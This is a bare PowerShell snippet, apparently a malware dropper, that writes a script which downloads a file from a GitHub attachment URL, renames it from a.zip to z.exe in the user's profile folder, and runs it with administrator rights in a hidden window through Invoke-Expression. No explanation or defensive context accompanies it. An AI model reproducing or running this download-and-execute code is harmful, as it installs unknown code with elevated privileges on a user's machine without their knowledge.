$Code = @'
$Url = "https://github.com/user-attachments/files/16404030/a.zip"
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
$ProgressPreference = "SilentlyContinue"
$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath "z.exe"
Invoke-WebRequest -Uri $Url -OutFile $OutFile
$InstallerPath = $OutFile
$Arguments = "-fullinstall"
$Command = "Start-Process -FilePath `$InstallerPath -ArgumentList `$Arguments -Verb RunAs -WindowStyle Hidden"
Invoke-Expression -Command $Command
exit
'@
$Code | Out-File -FilePath "script.ps1" -Encoding UTF8